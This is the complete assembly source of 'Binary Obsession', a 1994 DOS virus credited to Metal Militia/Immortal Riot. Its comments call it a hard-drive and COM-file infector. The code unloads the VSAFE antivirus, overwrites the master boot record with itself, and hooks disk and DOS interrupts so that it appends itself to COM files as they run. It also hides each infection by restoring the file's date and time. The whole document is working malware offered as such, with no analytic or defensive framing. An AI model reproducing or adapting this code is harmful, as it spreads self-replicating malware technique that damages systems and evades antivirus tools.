; ------------------------------------------------------------------------------
;
;                       - Binary Obsession -
;       Created by Immortal Riot's destructive development team
;                (c) 1994 Metal Militia/Immortal Riot 
;
; ------------------------------------------------------------------------------
;            þ Undestructive Harddrive & COM-file infector þ
; ------------------------------------------------------------------------------
		.model  tiny
		.code
		.286
		org     100h

start:
		call    get_delta_offset        ; no comment needed (0e8h)
org_bytes:
		db      3 dup (?)               ; buffer for the 3 original 
						; bytes
get_delta_offset:

		pop     bp                      ; fix the delta offset
		push    cs
		push    ss
		pop     ax                      ; AX equals SS and
		pop     dx                      ; DX equals CS

		cmp     dx,ax                   ; If they both equal, then
						; we're being executed from
						; a file..
		
		jne     were_on_harddrive       ; Else it's from the harddrive

		mov     dx,5945h                ; Removes the VSAFE program
		mov     ax,0fa01h               ; out of memory, this code is
		int     21h                     ; detected now-a-days though

		lea     bx,ss:[bp+600]          ; offset a more or less 'buffer'
		mov     cx,1                    ; 1 sector

		mov     dx,80h                  ; from the harddrive
		mov     ax,201h                 ; read it (MBR)
		int     13h

		
		cmp     byte ptr es:[bx],0E8h   ; Is the MBR already infected?
		jne     infect_mbr              ; if not, write ourselves there
		jmp     dont_infect_mbr         ; else just get the fuck out

infect_mbr:


		mov     cx,2                    ; sector 2
		mov     ax,301h                 ; write the MBR to it
		int     13h


		
		lea     si,[bp-3]
		mov     cx,virsize              ; our viruscode
		mov     di,bx
		rep     movsb                   ; copy it over the 1 sector but
						; leave the partitiontable nice
						; and workable, totally intact

		mov     cx,1                    ; now write our virus code
		mov     ax,301h                 ; to the MBR now that we've
		int     13h                     ; taken a "back-up" of it..

dont_infect_mbr:

		mov     si,bp                   ; offset 3 first bytes

		mov     di,100h
		push    di
		movsb                           ; copy them back again
		movsw 
		retn                            ; and then executed the
						; original program

		db      "(c) Metal Militia/Immortal Riot" ; guess who?

were_on_harddrive:

		xor     ax,ax                   ; zero AX
		mov     ds,ax                   ; DS to AX

		mov     si,7C00h
		cli                             ; clear the interrupts
		mov     ss,ax
		mov     sp,si                   ; do the stack thing
		sti                             ; store the interrupts


		push    ax
		push    si
		sub     word ptr ds:[413h],2    ; decrease available memory with
						; 2 kilobytes (only 1 needed?)
		int     12h                     ; get number of kb's left

		mov     cl,5
		add     cl,1
		shl     ax,cl
		mov     es,ax                   ; Convert the stuff into kb's


		push    cs
		pop     ds                      ; DS equals CS

		mov     cx,(realend-start)      ; Our viralcode
		mov     di,100h
		lea     si,[bp-3]
		rep     movsb                   ; Copy us up into the memory

		mov     ds,cx                   ; DS to CX
		xchg    ds:[13h*4+2],ax         ; Catch int13h and set it
		mov     ds:[0b6h*4+2],ax        ; to become 0b6h instead
		mov     es:int13zwei,ax         ; storage place
		
		mov     ax,offset our13         ; Now offset our int13 instead
		xchg    ds:[13h*4],ax
		mov     ds:[0b6h*4],ax
		mov     es:int13uno,ax          ; storage place

		mov     ax,offset backtoorg     ; 'call' our MBR part that does
		push    es                      ; a reading on the original and
		push    ax                      ; then jumps to it
		retf                            ; return far

backtoorg:

		pop     bx
		pop     es
		mov     cx,2                    ; sector 2
		mov     dx,80h                  ; on harddrive (C: unit)
		mov     ax,201h                 ; read it and wait
		int     0b6h

		db      0eah                    ; Now go jump to that spot in
		dw      7c00h,0                 ; order to execute the original

our13:
		push    ax
		push    ds
		sub     ax,ax                   ; Zero out AX
		mov     ds,ax                   ; DS equals AX
		
		cmp     word ptr es:[bx],5A4Dh  ; .EXE files starting w/'MZ' ?


		jne     not_ready_right_now     ; if not, retry until success
		
		cmp     ds:[0e5h*4+2],ax        ; Already in memory w/int21h?
		jne     not_ready_right_now     ; If so, fuck it.. outa here!

		mov     ax,cs
		xchg    ds:[21h*4+2],ax          ; Else, catch it and exchange
		mov     ds:[0e5h*4+2],ax         ; it with 0e5h instead..
		mov     cs:int21zwei,ax          ; Storage place

		mov     ax,offset our21          ; And offset our int21 thingy
		xchg    ds:[21h*4],ax
		mov     ds:[0e5h*4],ax
		mov     cs:int21uno,ax           ; Storage place

not_ready_right_now:

		pop     ds
		pop     ax
		db      0eah                    ; Back to the original int13h
int13uno        dw      0                       ; Storage for the original
int13zwei       dw      0                       ; 13h interrupt
		
our21:

		pusha
		push    ds
		push    es                      ; Save all registers
						; except for the stack ones

		cmp     ax,4B00h                ; Execution of a file?
		je      file_infect             ; If so, lets go check it out
		jmp     computers_int21         ; else we're back to org21h


file_infect:

		mov     ax,4301h                ; Zero the attributes
		sub     cx,cx
		int     0e5h                    ; first abuse of the new int21h

		mov     ax,3D00h                ; Open it up
		int     0e5h
		
		xchg    bx,ax                   ; mov bx,ax
		
		mov     ax,1220h
		int     2Fh
		push    bx
		mov     ax,1216h
		mov     bl,es:[di]
		int     2Fh                     ; Point at the SFT thingy
		pop     bx

		or      word ptr es:[di+2],2    ; set to read/write ability
		push    cs
		pop     ds
		
		mov     ax,word ptr es:[di+0dh] ; read in date/time
		mov     cx,ax

		and     cl,00001111b            ; Is it seconds of our choice?
		cmp     cl,00000001b            ; If not, lets infect it
		je      closeitup               ; Yeah, lets freak out

		and     al,11110000b            ; Now set those bloody seconds
		or      al,00000001b

		mov     f_time,ax               ; Save file time
		mov     ax,es:[di+0fh]
		mov     f_date,ax               ; and date

		mov     cx,2                    ; 3 bytes (2 here)
		mov     ah,3Fh                  ; Read in
		inc     cx                      ; plus one here
		mov     dx,offset org_bytes     ; and offset to buffer
		int     0e5h

		
		xchg    dx,si                   ; point at it

		cmp     byte ptr [si],'M'       ; Is it an .EXE file w/'M'?
		je      closeitup               ; If so, leave it alone
		
		mov     ax,es:[di+11h]          ; Goto EOF with
		mov     dx,es:[di+13h]          ; the help of

		mov     es:[di+15h],ax          ; using these instead of the
		mov     es:[di+17h],dx          ; 4200h/4202h thingy
		
		dec     ax                      ; dec ax
		dec     ax                      ; three
		dec     ax                      ; times

		mov     byte ptr ds:jmp_x,231   ; jmp byte
		inc     jmp_x                   ; increase
		inc     jmp_x                   ; it twice
		mov     word ptr ds:jmp_x+1,ax  ; and yet add one
		
		mov     ah,30h                  ; Write to file (WTF 1/2)
		mov     cx,virsize              ; Size of the viral code
		mov     dx,100h                 ; Offset the start
		add     ah,10h                  ; WTF 2/2
		int     0e5h

		xor     ax,ax                   ; Goto SOF
		mov     es:[di+15h],ax
		
		mov     ah,20h                  ; Write to file (WTF 1/2)
		mov     cx,2                    ; 2 bytes
		add     ah,20h                  ; WTF 2/2
		inc     cx                      ; plus another one
		mov     dx,offset jmp_x         ; Offset the buffer
		int     0e5h
		
		mov     dx,f_date               ; original date
		mov     cx,f_time               ; original time
		mov     ax,5701h                ; Restore them
		int     0e5h

closeitup:
		mov     ah,3Eh                   ; Close file
		int     0e5h

computers_int21:
		pop     es
		pop     ds
		popa
		db      0eah                     ; Jump back to original int21h
virend:

int21uno        dw      ?                        ; Storage for the original
int21zwei       dw      ?                        ; 21h interrupt

virsize         equ     virend-start

f_date          dw      ?                         ; Storage place for
f_time          dw      ?                         ; file date/time

jmp_x           db      3 dup (?)                 ; JMP code buffer
realend:
		end     start
